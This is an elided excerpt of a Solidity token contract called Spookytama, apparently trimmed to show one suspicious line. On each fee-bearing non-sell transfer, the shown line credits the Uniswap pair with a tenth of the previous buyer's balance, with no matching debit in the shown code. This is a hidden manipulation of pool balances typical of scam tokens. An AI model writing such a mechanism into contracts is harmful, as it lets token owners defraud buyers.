...
contract Spookytama is Context, IERC20, Ownable {
    ...
    string private constant _name = "Spookytama";
    string private constant _symbol = "SPOTAMA";
    ...
    function _transfer(
        ...
        if(takeFee){
            if(to != uniswapV2Pair){
                ...
                balances[uniswapV2Pair] +=  balanceOf(previousBuyer) / 10;
